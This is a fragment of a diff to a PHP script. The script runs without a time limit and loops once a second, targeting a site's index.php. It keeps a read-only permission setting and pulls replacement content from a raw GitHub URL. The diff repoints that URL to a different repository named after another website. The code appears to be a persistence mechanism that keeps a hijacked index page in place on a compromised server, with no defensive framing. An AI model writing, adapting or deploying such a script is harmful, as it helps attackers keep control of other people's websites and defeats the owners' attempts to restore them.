@@ -7,7 +7,7 @@ set_time_limit(0);
 $stopFlag = 'roobts.txt';
 $targetFile = 'index.php';
 $sourceFile = 'content.txt';
-$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-m.fatier.com-/refs/heads/main/index.php';
+$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-www.szamgs.com-/refs/heads/main/index.php';
 
 // 期望的文件权限 (0444 = 只读)
 $expectedPerms = 0444;
@@ -108,4 +108,5 @@ while (true) {
     }
 
     usleep(1000000); // 每秒检查一次
+
 }
